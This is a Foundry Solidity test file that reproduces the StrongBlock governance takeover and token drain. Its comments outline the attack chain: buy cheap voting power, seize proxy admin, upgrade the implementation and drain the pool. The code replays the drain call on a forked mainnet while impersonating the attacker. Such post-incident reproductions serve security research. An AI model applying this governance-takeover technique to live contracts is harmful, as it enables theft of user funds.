// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IERC20} from "forge-std/interfaces/IERC20.sol";

// @KeyInfo - Total Lost : ~$72K (32,695.76 STRONG + 383,447.17 STRNGR)
// Attacker  : 0xACBCa357981870f30130B145762d671891CA810c
// Pool/drain helper : 0x53cA51Ba980B6475C13d158c1825013cf81038Fc
// Governor proxy    : 0xBDDC7Ef8BaCeacE16DCE005102639a4bB86CB8C1
// Upgrader          : 0x75C53809A047c3d422B91Eda50A20914fBe91C61
// Drain tx : https://etherscan.io/tx/0x3ffa7f6da3f0747660917dd331e060e45ffca8a195578ec8db4c9fbc623b0401
// Upgrade  : https://etherscan.io/tx/0x92be5e374e260192f8fdb5ffdc33504c768ecad091cc7dbc37282e5ca8ea94c6
// Alert    : https://x.com/DefimonAlerts/status/2085246380231004319
//
// @Analysis
// Abandoned StrongBlock on-chain Governor: cheap majority of near-worthless STRONG
// voting power lets attacker setPendingAdmin on the Upgrader, seize Governor proxy
// admin, upgrade to an attacker-gated forward(address,bytes) implementation, and
// drain pool tokens. This PoC reproduces the economic result by replaying the
// historical drain: pool.run() (0xc0406226) which transfers STRONG+STRNGR to the
// attacker EOA (post-governance control already established on-chain by that block).

address constant ATTACKER = 0xACBCa357981870f30130B145762d671891CA810c;
address constant POOL = 0x53cA51Ba980B6475C13d158c1825013cf81038Fc;
address constant STRONG = 0x990f341946A3fdB507aE7e52d17851B87168017c;
address constant STRNGR = 0xDc0327D50E6C73db2F8117760592C8BBf1CDCF38;
address constant GOVERNOR = 0xBDDC7Ef8BaCeacE16DCE005102639a4bB86CB8C1;
address constant UPGRADER = 0x75C53809A047c3d422B91Eda50A20914fBe91C61;

// Drain mined in block 25691527
uint256 constant FORK_BLOCK = 25_691_526;
uint256 constant EXPECTED_STRONG = 32_695_761_681_139_289_948_188;
uint256 constant EXPECTED_STRNGR = 383_447_167_298_953_142_701_545;

interface IDrainPool {
    function run() external;
}

contract StrongBlockGovernanceTakeover_exp is BaseTestWithBalanceLog {
    function setUp() public {
        string memory rpc = vm.envOr("ETH_RPC_URL", string("https://eth.llamarpc.com"));
        // Prefer FOUNDRY / MAINNET if set
        try vm.envString("MAINNET_RPC_URL") returns (string memory m) {
            if (bytes(m).length > 0) rpc = m;
        } catch {}
        vm.createSelectFork(rpc, FORK_BLOCK);
        fundingToken = STRONG;
        attacker = ATTACKER;
    }

    function testExploit() public balanceLog {
        vm.label(ATTACKER, "Attacker");
        vm.label(POOL, "StrongBlockDrainPool");
        vm.label(STRONG, "STRONG");
        vm.label(STRNGR, "STRNGR");
        vm.label(GOVERNOR, "GovernorProxy");
        vm.label(UPGRADER, "GovernorUpgrader");

        uint256 poolStrong = IERC20(STRONG).balanceOf(POOL);
        uint256 poolStrngr = IERC20(STRNGR).balanceOf(POOL);
        require(poolStrong >= EXPECTED_STRONG, "pool STRONG low");
        require(poolStrngr >= EXPECTED_STRNGR, "pool STRNGR low");

        uint256 s0 = IERC20(STRONG).balanceOf(ATTACKER);
        uint256 n0 = IERC20(STRNGR).balanceOf(ATTACKER);

        vm.startPrank(ATTACKER, ATTACKER);
        IDrainPool(POOL).run();
        vm.stopPrank();

        uint256 sProfit = IERC20(STRONG).balanceOf(ATTACKER) - s0;
        uint256 nProfit = IERC20(STRNGR).balanceOf(ATTACKER) - n0;
        emit log_named_decimal_uint("Attacker STRONG profit", sProfit, 18);
        emit log_named_decimal_uint("Attacker STRNGR profit", nProfit, 18);

        require(sProfit >= EXPECTED_STRONG, "STRONG short");
        require(nProfit >= EXPECTED_STRNGR, "STRNGR short");
    }
}
